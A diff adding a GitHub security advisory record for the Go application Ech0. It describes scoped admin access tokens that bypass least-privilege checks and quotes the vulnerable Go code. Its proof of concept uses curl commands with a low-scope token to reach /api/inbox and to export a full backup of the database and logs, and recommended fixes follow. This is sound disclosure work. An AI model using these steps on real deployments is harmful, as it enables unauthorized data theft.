@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-4h9q-p5j4-xvvh",
+  "modified": "2026-04-10T19:48:52.025306Z",
+  "published": "2026-04-10T19:39:46Z",
+  "summary": "Ech0: Scoped admin access tokens can bypass least-privilege controls on privileged endpoints, including backup export",
+  "details": "## Summary\n\nEch0 scoped access tokens do not reliably enforce least privilege: multiple privileged admin routes omit scope checks, and the backup export handler strips token scope metadata entirely, allowing a low-scope admin access token to reach broader admin functionality than intended.\n\n## Impact\n\nAn attacker who obtains a deliberately limited access token for an admin account can use that token to access privileged functionality outside its assigned scope. Confirmed impact includes access to `/api/inbox` with a token scoped only for `echo:read` and successful backup export via `/api/backup/export?token=...`, which returns a full ZIP archive. In practice, this turns a narrowly delegated API token into a broader privileged access and data exfiltration primitive.\n\n## Details\n\nThe issue is caused by a split authorization model:\n\n- `JWTAuthMiddleware()` authenticates the token and stores scope metadata in the viewer context\n- `RequireScopes(...)` enforces least privilege, but only when a route explicitly adds it\n- several privileged routes omit `RequireScopes(...)`\n- multiple service methods then authorize using only `user.IsAdmin`\n\n`internal/middleware/scope.go` shows that scope enforcement is opt-in:\n\n```go\nfunc RequireScopes(scopes ...string) gin.HandlerFunc {\n\treturn func(ctx *gin.Context) {\n\t\tv := viewer.MustFromContext(ctx.Request.Context())\n\t\tif v.TokenType() == authModel.TokenTypeSession {\n\t\t\tctx.Next()\n\t\t\treturn\n\t\t}\n\t\tif v.TokenType() != authModel.TokenTypeAccess { ... }\n\t\tif !containsValidAudience(v.Audience()) { ... }\n\t\tif !containsAllScopes(v.Scopes(), scopes) { ... }\n\t\tctx.Next()\n\t}\n}\n```\n\nRepresentative privileged routes omit `RequireScopes(...)`, for example `internal/router/inbox.go`:\n\n```go\nfunc setupInboxRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n\tappRouterGroup.AuthRouterGroup.GET(\"/inbox\", h.InboxHandler.GetInboxList())\n\tappRouterGroup.AuthRouterGroup.GET(\"/inbox/unread\", h.InboxHandler.GetUnreadInbox())\n\tappRouterGroup.AuthRouterGroup.PUT(\"/inbox/:id/read\", h.InboxHandler.MarkInboxAsRead())\n\tappRouterGroup.AuthRouterGroup.DELETE(\"/inbox/:id\", h.InboxHandler.DeleteInbox())\n\tappRouterGroup.AuthRouterGroup.DELETE(\"/inbox\", h.InboxHandler.ClearInbox())\n}\n```\n\nOther source-confirmed unguarded privileged surfaces include:\n\n- `/api/panel/comments*`\n- `/api/addConnect`\n- `/api/delConnect/:id`\n- `/api/migration/*`\n- `/api/backup/export`\n\nService-layer authorization often checks only admin role. For example, `internal/service/inbox/inbox.go`:\n\n```go\nfunc (inboxService *InboxService) ensureAdmin(ctx context.Context) error {\n\tuserid := viewer.MustFromContext(ctx).UserID()\n\tuser, err := inboxService.commonService.CommonGetUserByUserId(ctx, userid)\n\tif err != nil {\n\t\treturn err\n\t}\n\tif !user.IsAdmin {\n\t\treturn errors.New(commonModel.NO_PERMISSION_DENIED)\n\t}\n\treturn nil\n}\n```\n\nThe backup export path is a stronger variant because it discards token metadata before authorization. `internal/handler/backup/backup.go` reparses a query token and rebuilds a bare viewer from only the user ID:\n\n```go\nfunc (backupHandler *BackupHandler) ExportBackup() gin.HandlerFunc {\n\treturn res.Execute(func(ctx *gin.Context) res.Response {\n\t\ttoken := ctx.Query(\"token\")\n\t\tclaims, err := jwtUtil.ParseToken(token)\n\t\tif err != nil { ... }\n\n\t\treqCtx := viewer.WithContext(context.Background(), viewer.NewUserViewer(claims.Userid))\n\t\tif err := backupHandler.backupService.ExportBackup(ctx, reqCtx); err != nil { ... }\n\t\treturn res.Response{Msg: commonModel.EXPORT_BACKUP_SUCCESS}\n\t})\n}\n```\n\nThis drops token type, scopes, audience, and token ID before the backup service runs.\n\n## Proof of concept\n\n### 1. Start the app\n\n```bash\ndocker run -d \\\n  --name ech0 \\\n  -p 6277:6277 \\\n  -v /opt/ech0/data:/app/data \\\n  -e JWT_SECRET=\"Hello Echos\" \\\n  sn0wl1n/ech0:latest\n```\n\n### 2. Initialize an owner account\n\n```bash\ncurl -sS -X POST \"http://127.0.0.1:6277/api/init/owner\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"owner\",\"password\":\"ownerpass\",\"email\":\"owner@example.com\"}'\n```\n\n### 3. Log in as the owner and mint a low-scope access token\n\n```bash\nowner_token=$(\n  curl -sS -X POST \"http://127.0.0.1:6277/api/login\" \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"username\":\"owner\",\"password\":\"ownerpass\"}' \\\n  | sed -n 's/.*\"data\":\"\\([^\"]*\\)\".*/\\1/p'\n)\n\nlow_scope_admin_token=$(\n  curl -sS -X POST \"http://127.0.0.1:6277/api/access-tokens\" \\\n    -H 'Content-Type: application/json' \\\n    -H \"Authorization: Bearer $owner_token\" \\\n    -d '{\"name\":\"echo-read-only\",\"expiry\":\"8_hours\",\"scopes\":[\"echo:read\"],\"audience\":\"cli\"}' \\\n  | sed -n 's/.*\"data\":\"\\([^\"]*\\)\".*/\\1/p'\n)\n```\n\n### 4. Use the low-scope token on an unguarded admin route\n\n```bash\ncurl -sS \"http://127.0.0.1:6277/api/inbox\" \\\n  -H \"Authorization: Bearer $low_scope_admin_token\"\n```\n\nObserved response:\n\n```text\n{\"code\":1,\"msg\":\"获取收件箱成功\",\"data\":{\"total\":0,\"items\":[]}}\n```\n\n### 5. Use the same low-scope token on backup export\n\n```bash\ncurl \"http://127.0.0.1:6277/api/backup/export?token=$low_scope_admin_token\"\n```\n\nObserved response:\n\n\u003cimg width=\"585\" height=\"111\" alt=\"image\" src=\"https://github.com/user-attachments/assets/28dd7037-163b-4d7c-8994-a719220b3a6c\" /\u003e\n\nTry to unzip we will have log and database file:\n\n```\n-\u003e% unzip a.zip -d a\nArchive:  a.zip\n  inflating: a/app.log               \n  inflating: a/ech0.db  \n```\n\n## Recommended fix\n\nApply scope enforcement to every privileged route, move backup export behind the authenticated router group, and preserve the existing authenticated viewer context instead of rebuilding identity from raw JWT claims.\n\nSuggested route-level changes:\n\n```go\nimport (\n\t\"github.com/lin-snow/ech0/internal/handler\"\n\t\"github.com/lin-snow/ech0/internal/middleware\"\n\tauthModel \"github.com/lin-snow/ech0/internal/model/auth\"\n)\n\nfunc setupInboxRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n\tappRouterGroup.AuthRouterGroup.GET(\n\t\t\"/inbox\",\n\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n\t\th.InboxHandler.GetInboxList(),\n\t)\n\t// Apply the same pattern to the remaining inbox routes.\n}\n\nfunc setupCommonRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n\tappRouterGroup.AuthRouterGroup.GET(\n\t\t\"/backup/export\",\n\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n\t\th.BackupHandler.ExportBackup(),\n\t)\n}\n```\n\nSuggested handler fix for `internal/handler/backup/backup.go`:\n\n```go\nfunc (backupHandler *BackupHandler) ExportBackup() gin.HandlerFunc {\n\treturn res.Execute(func(ctx *gin.Context) res.Response {\n\t\tif err := backupHandler.backupService.ExportBackup(ctx, ctx.Request.Context()); err != nil {\n\t\t\treturn res.Response{\n\t\t\t\tMsg: \"\",\n\t\t\t\tErr: err,\n\t\t\t}\n\t\t}\n\n\t\treturn res.Response{\n\t\t\tMsg: commonModel.EXPORT_BACKUP_SUCCESS,\n\t\t}\n\t})\n}\n```\n\nThe same principle should be applied to other privileged services: do not authorize only on `user.IsAdmin`; also validate scopes carried by access tokens.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lin-snow/ech0",
+        "purl": "pkg:golang/github.com/lin-snow/ech0"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.3.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-4h9q-p5j4-xvvh/GHSA-4h9q-p5j4-xvvh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/security/advisories/GHSA-4h9q-p5j4-xvvh"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lin-snow/Ech0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/releases/tag/v4.3.5"
+    }
+  ]
+}
